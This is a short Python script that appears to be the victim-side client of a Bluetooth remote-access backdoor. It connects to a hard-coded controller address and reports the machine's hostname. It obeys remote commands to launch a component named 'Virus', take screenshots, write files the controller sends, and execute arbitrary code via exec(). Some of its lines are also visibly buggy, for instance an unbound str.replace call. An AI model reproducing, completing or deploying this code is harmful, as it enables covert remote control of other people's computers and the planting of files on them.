import socket
import ClientUI
import threading
import pyautogui
import os 

screeniecounter = 0
fileerror= 0
client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
client.connect(("6c:2f:80:71:84:8b", 4))

client.send(socket.gethostname().encode())
th = threading.Thread(target=ClientUI.Virus,daemon=True)

byt = b""
try:
    while True:
        data = client.recv(9999999999)
        if not data:
            break
        
        try:
            data = data.decode()
        except Exception as e:
            byt += data
            continue

        print(data)
        if data == "1":
           client.send(ClientUI.Connect().encode())
        elif data == "2" and not th.is_alive():
            th.start()
        elif data == "3":
            print(pyautogui.screenshot().tobytes())
            client.send("end".encode())
        elif "img" in data:
            with open(data.split(" ")[1],"wb") as file:
                file.write(byt)
            byt = b""
        elif "cmdmode:" in data:
            str.replace('cmdmode:', '')
            exec(data)

    print("Update Window")
except OSError as e:
    pass

client.close()
if ClientUI.window and ClientUI.window.winfo_exists():
    ClientUI.window.quit()